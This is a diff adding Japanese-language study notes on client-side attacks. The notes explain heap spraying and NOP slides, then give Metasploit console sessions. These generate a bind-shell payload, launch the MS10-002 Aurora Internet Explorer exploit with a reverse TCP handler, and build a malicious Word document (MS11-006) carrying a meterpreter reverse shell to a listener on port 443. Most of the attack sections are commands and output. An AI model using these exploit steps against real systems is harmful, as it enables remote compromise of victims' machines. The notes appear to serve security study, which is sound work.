@@ -1,0 +1,94 @@
+クライアントサイド攻撃を用いたエクスプロイト
+
+クライアントサイド攻撃とはネットワーク防御が強化された結果生み出された攻撃の進化系。
+クライアントサイド攻撃とはマシンに通常インストールされているブラウザやPDFリーダ、officeなどの
+アプリケーションを対象とする。
+例えばメールに添付してリンク辿らせるパターンとかはこれに該当。
+インターネット経由に何かやるよりユーザ側からなにかやらせる方が楽。
+
+ブラウザベースのエクスプロイト
+ブラウザは利用時間が非常に長いので対象としては非常に良い。
+ただし攻撃対象のブラウザに攻撃して成功した場合、一般ユーザのセッションを
+取得することの方が多い。なので権限昇格が必須となる。
+
+ブラウザベースのエクスプロイトの効果
+ブラウザベースのエクスプロイトと従来のエクスプロイトとの違いはシェルコード送信に用いられる手法。
+従来はリモートコードであり悪意あるペイロードを配信。
+ブラウザはヒープスプレーと呼ばれるエクスプロイト技法。
+ヒープとはまだ割り当てられていないメモリ領域。ヒープはコンピュータのメモリがどれだけ使用可能かにより
+アプリケーション起動中はずっと使用される。
+ランタイム時に割り当てられるメモリの位置は誰にも分からない。なのでヒープスプレー手法が
+発見されるまでは攻撃を成功させるための大きな障壁でもあった。
+ノーオペレーション命令（NOP）は何もせずに次の命令へ移れというアセンブリ命令。
+NOPスライドはメモリ内で互いに隣接するNOPからなりたっており、
+プログラムの実行中一連のNOP命令に遭遇すると命令の最後までスライドして次の命令に移ること。
+ヒープスプレー手法はヒープをNOPスライドの繰り返しパターンとシェルコードで埋めるもの。
+
+NOPシェルコードを解析する
+デバッガはアセンブリ命令の実行の流れ、メモリの内容、例外の詳細を含むプログラム動作状態を
+知る方法を提供してくれる。
+今回はImmunity Debuggerを利用する。
+http://sento.hatenablog.com/entry/2015/10/03/124749
+どうもWindowsに入れたほうが楽っぽい。
+
+Debuggerを利用してバイナリもいじったが動作せず。
+実際に記載のあった内容は古かったのでバイナリは以下の方法にて入手
+msf > use payload/windows/shell/bind_tcp
+msf payload(windows/shell/bind_tcp) > generate
+動作すると待ちうけポートが追加されるよう。
+
+Internet Explorer Auroraエクスプロイト
+2010年に広まった攻撃について
+msf payload(windows/shell/bind_tcp) > use exploit/windows/browser/ms10_002_aurora
+msf exploit(windows/browser/ms10_002_aurora) > show options
+
+Module options (exploit/windows/browser/ms10_002_aurora):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(windows/browser/ms10_002_aurora) > set SRVPORT 80
+SRVPORT => 80
+msf exploit(windows/browser/ms10_002_aurora) > set URIPATH /
+URIPATH => /
+msf exploit(windows/browser/ms10_002_aurora) > set LPORT 443
+LPORT => 443
+msf exploit(windows/browser/ms10_002_aurora) > exploit -z
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 10.61.7.100:443
+
+ファイルフォーマットエクスプロイト
+ファイルフォーマットのバグはアプリケーションでみつかるエクスプロイト可能な脆弱性のこと。
+従来のファイルフォーマットエクスプロイトではターゲットが影響を受けやすいものであればなんでもいい。
+msf exploit(windows/fileformat/ms11_006_createsizeddibsection) > use exploit/windows/fileformat/ms11_006_createsizeddibsection
+msf exploit(windows/fileformat/ms11_006_createsizeddibsection) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(windows/fileformat/ms11_006_createsizeddibsection) > set LHOST 10.61.71.100
+LHOST => 10.61.71.100
+msf exploit(windows/fileformat/ms11_006_createsizeddibsection) > set LPORT 443
+LPORT => 443
+msf exploit(windows/fileformat/ms11_006_createsizeddibsection) > exploit
+
+[*] Creating 'msf.doc' file ...
+[+] msf.doc created at /root/.msf4/local/msf.doc
+msf exploit(windows/fileformat/ms11_006_createsizeddibsection) >
+
+これでファイルが作成されるのでこれが対象端末で実行されれば通常通り通信が開始される。
+ただ検出はされた。
+
+この攻撃を成功させるにはユーザの情報をどれだけ事前にしっているかにかかってくる。
+10章で詳しく。
